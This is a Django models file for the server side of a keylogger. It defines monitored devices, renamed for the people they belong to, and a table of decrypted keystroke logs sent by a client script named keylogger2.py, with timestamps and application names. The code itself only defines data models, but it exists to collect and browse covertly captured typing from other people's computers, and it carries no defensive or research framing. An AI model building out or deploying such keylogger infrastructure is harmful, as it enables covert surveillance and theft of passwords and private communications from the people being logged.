# dashboard/models.py
from django.db import models
from django.contrib.auth.models import User as DjangoAdminUser # For admin user association (optional)
import uuid

class MonitoredDevice(models.Model):
    # This is the unique hardware/OS identifier sent by the client
    hostname = models.CharField(max_length=255, unique=True, db_index=True)
    
    # A display name that can be set by an admin for easier identification (e.g., "Jesish's Laptop")
    # This is what fulfills the "renaming" requirement.
    display_name = models.CharField(max_length=100, blank=True, null=True)
    
    # Internal UUID for Django use, if needed, not directly exposed to client usually
    device_uuid = models.UUIDField(default=uuid.uuid4, editable=False, unique=True)
    
    first_seen = models.DateTimeField(auto_now_add=True)
    last_seen = models.DateTimeField(auto_now=True) # Updates every time the model is saved (e.g., new log)
    
    is_active = models.BooleanField(default=True) # Admin can disable logging/visibility for a device

    # Optional: Link to a Django admin user who 'owns' or manages this device
    # managed_by = models.ForeignKey(DjangoAdminUser, on_delete=models.SET_NULL, null=True, blank=True)

    def __str__(self):
        return self.get_effective_display_name()

    def get_effective_display_name(self):
        """Returns the admin-set display_name or a default based on hostname/UUID."""
        if self.display_name:
            return self.display_name
        # Fallback to a more descriptive name if display_name is not set
        return f"Device ({self.hostname.split('.')[0]}_{str(self.device_uuid)[:4]})"

    class Meta:
        verbose_name = "Monitored Device"
        verbose_name_plural = "Monitored Devices"
        ordering = ['-last_seen']


class KeystrokeLog(models.Model):
    device = models.ForeignKey(MonitoredDevice, on_delete=models.CASCADE, related_name='logs')
    
    # Timestamp when the server received and recorded this log entry
    server_timestamp = models.DateTimeField(auto_now_add=True, db_index=True)
    
    # The actual decrypted content of the log entry.
    # The format from keylogger2.py is "[client_timestamp_str] [app_name] Actual sentence"
    decrypted_content = models.TextField()

    # Optional: Store the client's timestamp explicitly if needed for more precise timing analysis
    # client_timestamp_str = models.CharField(max_length=50, blank=True, null=True)
    # application_name = models.CharField(max_length=255, blank=True, null=True)
    # keystrokes = models.TextField(blank=True, null=True)

    def __str__(self):
        return f"Log for {self.device.get_effective_display_name()} at {self.server_timestamp.strftime('%Y-%m-%d %H:%M:%S')}"

    class Meta:
        verbose_name = "Keystroke Log"
        verbose_name_plural = "Keystroke Logs"
        ordering = ['-server_timestamp']